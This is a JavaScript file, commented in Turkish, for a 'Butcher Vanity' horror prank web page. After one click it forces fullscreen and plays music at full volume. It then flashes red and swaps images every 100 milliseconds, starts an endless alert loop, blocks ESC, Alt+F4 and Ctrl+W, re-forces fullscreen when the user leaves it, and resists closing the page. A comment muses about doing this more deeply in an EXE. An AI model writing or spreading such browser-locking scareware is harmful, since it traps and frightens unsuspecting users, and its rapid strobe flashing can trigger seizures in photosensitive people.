const startButton = document.getElementById('startButton');
const overlay = document.getElementById('overlay');
const content = document.getElementById('content');
const bgMusic = document.getElementById('bgMusic');
const mainImage = document.getElementById('mainImage');
const flashOverlay = document.getElementById('flashOverlay');

// Görsel Listesi (Yeni Fotolar)
const imageSequence = ['aboo.png', 'e2e.png', 'eeeee.png', 'vanityuu.png'];
let currentImgIndex = 0;
let imageInterval;

// Başlatma Fonksiyonu
startButton.addEventListener('click', () => {
    // 1. Tam Ekran İsteği
    const docEl = document.documentElement;
    if (docEl.requestFullscreen) {
        docEl.requestFullscreen();
    } else if (docEl.webkitRequestFullscreen) {
        docEl.webkitRequestFullscreen();
    }

    // 2. Arayüzü Göster ve Müziği Ayarla
    overlay.classList.add('hidden');
    content.classList.remove('hidden');
    
    bgMusic.volume = 1.0; // MAX SES Ayarı
    bgMusic.play().catch(e => console.log("Müzik çalınamadı:", e));

    // İlk 11 Saniye Boyunca Yavaş Değişim (Her 3 Saniyede Bir)
    imageInterval = setInterval(() => {
        currentImgIndex = (currentImgIndex + 1) % imageSequence.length;
        mainImage.src = imageSequence[currentImgIndex];
    }, 3000);

    // 3. 11 Saniyelik Gecikme Sonrası Flaş ve Spam Başlat
    setTimeout(() => {
        clearInterval(imageInterval); // Yavaş döngüyü durdur
        startHorrorEffects();
    }, 11000); // 11 Saniye (11000ms)
});

// Korku Efektleri Başlat
function startHorrorEffects() {
    // Flaş Patlaması (Anlık kırmızı patlama)
    flashOverlay.style.transition = 'none';
    flashOverlay.style.opacity = '1';
    
    setTimeout(() => {
        flashOverlay.style.transition = 'opacity 0.2s ease-out';
        flashOverlay.style.opacity = '0';
        
        // Patlama sonrası sürekli flaş başlasın
        setTimeout(() => {
            flashOverlay.classList.add('flash-active');
        }, 200);
    }, 100);

    // Görsel Değişim Döngüsü (HIZLI SPAM - Her 100ms'de bir foto değişir)
    setInterval(() => {
        currentImgIndex = (currentImgIndex + 1) % imageSequence.length;
        mainImage.src = imageSequence[currentImgIndex];
    }, 100);

    // MSG BOX Döngüsü (Butcher Vanity!)
    setTimeout(() => {
        while(true) {
            alert("Butcher Vanity!");
        }
    }, 1000);
}

// ALT+F4 ve ESC ENGELLEME (Yüzeysel katman)
// Not: Gerçek bir EXE'de bunlar daha derin işlenir, 
// burada 'onbeforeunload' ve 'keydown' ile engellemeye çalışıyoruz.

window.onbeforeunload = function() {
    return "Butcher Vanity seni bırakmıyor...";
};

document.addEventListener('keydown', (e) => {
    // ESC (27), ALT+F4 (115), CTRL+W (87) engelleme denemesi
    if (e.keyCode === 27 || (e.altKey && e.keyCode === 115) || (e.ctrlKey && e.keyCode === 87)) {
        e.preventDefault();
        return false;
    }
});

// Eğer tam ekrandan çıkılırsa zorla geri al (Sürekli kontrol)
document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement) {
        // Tam ekrandan çıktıysa 500ms içinde geri almayı dene (Kullanıcı etkileşimi gerekebilir)
        setTimeout(() => {
            const docEl = document.documentElement;
            docEl.requestFullscreen().catch(() => {});
        }, 500);
    }
});
